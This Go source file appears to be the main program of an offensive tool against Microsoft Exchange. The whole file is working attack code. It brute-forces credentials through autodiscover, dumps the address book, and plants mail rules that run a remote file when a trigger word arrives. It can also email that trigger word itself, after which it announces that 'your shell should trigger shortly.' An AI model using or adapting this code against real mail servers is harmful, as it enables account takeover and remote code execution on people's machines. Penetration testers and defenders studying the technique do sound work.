package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
)

//globals
var config utils.Session

//doRequest to a target domain
func exit(err error) {
	//we had an error and we don't have a MAPI session
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		fmt.Println(err)
	}
	os.Exit(exitcode)
}

func getMapiHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error
	fmt.Println("[*] Retrieving MAPI/HTTP info")
	if autoURLPtr == "" {
		resp, err = autodiscover.MAPIDiscover(config.Domain)
	} else {
		resp, err = autodiscover.MAPIDiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}
	return resp
}

func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error
	fmt.Println("[*] Retrieving RPC/HTTP info")
	if autoURLPtr == "" {
		resp, err = autodiscover.Autodiscover(config.Domain)
	} else {
		resp, err = autodiscover.Autodiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}

	url := ""
	user := ""
	for _, v := range resp.Response.Account.Protocol {
		if v.Type == "EXPR" {
			if v.SSL == "Off" {
				url = "http://" + v.Server
			} else {
				url = "https://" + v.Server
			}

		}
		if v.Type == "EXCH" {
			user = v.Server
		}
	}
	//fmt.Println(url)
	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
	//config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", "https://192.168.124.1", user)
	fmt.Printf("[+] RPC URL set: %s\n", config.RPCURL)
	return resp
}

func main() {
	domainPtr := flag.String("domain", "", "The target domain (usually the email address domain)")
	checkOnly := flag.Bool("check", false, "Checks to see if we can login and MAPI/HTTP is available")
	adminPtr := flag.Bool("admin", false, "Try login as an administrator")
	userPtr := flag.String("user", "", "A valid username")
	passPtr := flag.String("pass", "", "A valid password")
	ruleName := flag.String("rule", "", "A name for our rule")
	delRule := flag.String("delete", "", "Delete a rule, requires the ruleid as shown with -display")
	triggerWord := flag.String("trigger", "", "A keyword to trigger on")
	triggerLocation := flag.String("loc", "", "A location for our remote file")
	emailPtr := flag.String("email", "", "The target email address, used to select correct mailbox")
	autoURLPtr := flag.String("url", "", "If you know the Autodiscover URL, supply it here. Default behaviour is to try and find it via the domain")
	autodiscoverOnly := flag.Bool("autodiscover", false, "Only does the autodiscover, useful for checking if you can actually interact with the domain")
	displayRules := flag.Bool("display", false, "Display the current rules")
	tcpPtr := flag.Bool("tcp", false, "If set, we'll use TCP for the MAPI requests. Otherwise, we stick to MAPI over HTTP")
	basicPtr := flag.Bool("basic", false, "Don't try NTLM, just do straight Basic")
	insecurePtr := flag.Bool("insecure", false, "Don't verify SSL/TLS cerificate")
	brutePtr := flag.Bool("brute", false, "Try bruteforce usernames/passwords")
	stopSuccessPtr := flag.Bool("stop", false, "Stop on successfully finding a username/password")
	userList := flag.String("usernames", "", "Filename for a List of usernames")
	passList := flag.String("passwords", "", "Filename for a List of passwords")
	userpassList := flag.String("userpass", "", "Filename for a List of username:password combinations separated by a colon, one pair per line")
	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
	delayPtr := flag.Int("delay", 5, "Delay between attempts")
	autoSendPtr := flag.Bool("send", false, "Autosend an email once the rule has been created")
	createfPtr := flag.Bool("cf", false, "create a folder")
	abkPtr := flag.Bool("abk", false, "Get the address book")

	flag.Parse()

	if *domainPtr == "" && *autoURLPtr == "" {
		exit(fmt.Errorf("[x] Domain required or autodiscover URL required"))
	}

	if *brutePtr == true {
		fmt.Println("[*] Starting bruteforce")
		if *userpassList == "" {
			autodiscover.BruteForce(*domainPtr, *userList, *passList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
			return
		}
		autodiscover.UserPassBruteForce(*domainPtr, *userpassList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
		return
	}

	config.Domain = *domainPtr
	config.User = *userPtr
	config.Pass = *passPtr
	config.Email = *emailPtr
	config.Basic = *basicPtr
	config.Insecure = *insecurePtr
	config.Verbose = *verbosePtr
	config.Admin = *adminPtr

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var err error

	if *autodiscoverOnly == true {
		resp = getRPCHTTP(*autoURLPtr)
		fmt.Printf("[*] Autodiscover enabled and we could Authenticate.\nAutodiscover returned: %s", resp.Response.User)
		os.Exit(0)

	}

	if *tcpPtr == false {
		var mapiURL, abkURL, userDN string

		resp = getMapiHTTP(*autoURLPtr)
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" {
			exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
			//try RPC
			//fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
			//resp = getRPCHTTP(*autoURLPtr)
			//fmt.Println(resp.Response.Account.Protocol[0].Server)
			//mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.RPC)
		}

		fmt.Println("[+] MAPI URL found: ", mapiURL)
		fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)
		if *checkOnly == true {
			fmt.Println("[+] Authentication succeeded and MAPI/HTTP is available")
			os.Exit(0)
		}

		mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
	} else {
		//exit(fmt.Errorf("[x] RPC/HTTP not yet supported. "))

		resp = getRPCHTTP(*autoURLPtr)
		//os.Exit(0)
		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
	}

	logon, err := mapi.Authenticate()
	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		fmt.Println("[*] And we are authenticated")
		fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
		fmt.Println("[*] Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox

		if *abkPtr == true {
			fmt.Println("[*] Let's play addressbook")
			bindResp, _ := mapi.Bind()
			fmt.Printf("[*] Server GUID: %x\n", bindResp.ServerGUID)
			columns := make([]mapi.PropertyTag, 2)
			columns[0] = mapi.PidTagSMTPAddress
			columns[1] = mapi.PidTagDisplayName
			//columns[2] = mapi.PidTagEntryID
			rows, _ := mapi.QueryRows(1600, columns) //pull first 255 entries
			fmt.Println("[*] Found the following entries: ")
			for k := 0; k < int(rows.RowCount); k++ {
				for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
					//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
					fmt.Printf("%s ", rows.RowData[k].AddressBookPropertyValue[v].Value)
				}
				fmt.Println("")
			}
			exit(nil)

		}
		if *createfPtr == true {

			rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
			if er != nil {
				exit(er)
			}
			var folderid []byte
			for k := 0; k < len(rows.RowData); k++ {
				fmt.Printf("Folder [%x]%s : %x \n", rows.RowData[k][0].ValueArray, rows.RowData[k][0].ValueArray, rows.RowData[k][1].ValueArray)
				//I am extremely lazy and don't feel like converting from Unicode. This does a comparison to see
				//if the returned folder name (in unicode) is equal to "Contacts"
				if fmt.Sprintf("%x", rows.RowData[k][0].ValueArray) == "740075006e006e0065006c006d00650073007a0073" { //"49006e0062006f0078" {
					folderid = rows.RowData[k][1].ValueArray
				}
			}

			fmt.Printf("Folderid: %x\n", folderid)

			res, er := mapi.CreateMessage(folderid, nil)

			if er != nil {
				exit(er)
			}
			fmt.Println(res.MessageID)

			if 1 < 2 {
				return
			}

			return
		}
		//Display All rules
		if *displayRules == true {
			fmt.Println("[+] Retrieving Rules")
			rules, er := mapi.DisplayRules()
			if er != nil {
				exit(er)
			}
			fmt.Printf("[+] Found %d rules\n", len(rules))
			for _, v := range rules {
				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
			}
			exit(nil)
		}
		//Delete A rule
		if *delRule != "" {
			ruleid, err1 := hex.DecodeString(*delRule)
			if err1 != nil {
				exit(fmt.Errorf("[x] Incorrect ruleid format. "))
			}

			err = mapi.ExecuteMailRuleDelete(ruleid)
			if err == nil {
				fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
				rules, er := mapi.DisplayRules()
				if er != nil {
					exit(er)
				}
				fmt.Printf("[+] Found %d rules\n", len(rules))
				for _, v := range rules {
					fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
				}
				exit(nil)
			} else {
				exit(err)
			}

		}

		//Create a new rule
		if *ruleName != "" {
			fmt.Println("[*] Adding Rule")
			//delete message on delivery
			res, err := mapi.ExecuteMailRuleAdd(*ruleName, *triggerWord, *triggerLocation, true)
			if res.StatusCode != 0 {
				exit(fmt.Errorf("[x] Failed to create rule. %s", err))
			}
			if err != nil {
				exit(err)
			}
			fmt.Println("[*] Rule Added. Fetching list of rules...")
			rules, err := mapi.DisplayRules()
			if err != nil {
				exit(err)
			}
			fmt.Printf("[+] Found %d rules\n", len(rules))
			for _, v := range rules {
				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
			}

			if *autoSendPtr == true {
				fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
				time.Sleep(time.Second * (time.Duration)(30))
				fmt.Println("[*] Sending email")

				_, er := mapi.GetFolder(mapi.OUTBOX, nil)
				if er != nil {
					exit(er)
				}
				_, er = mapi.SendMessage(*triggerWord)
				if er != nil {
					exit(er)
				}
				//mapi.ReleaseObject(0x00)
				//mapi.SendMessage(message.MessageID)

				fmt.Println("[*] Message sent, your shell should trigger shortly.")
				exit(nil)
			}
			exit(nil)
		}
	} else {
		exit(fmt.Errorf("[x] An error occurred during authentication"))
	}

}
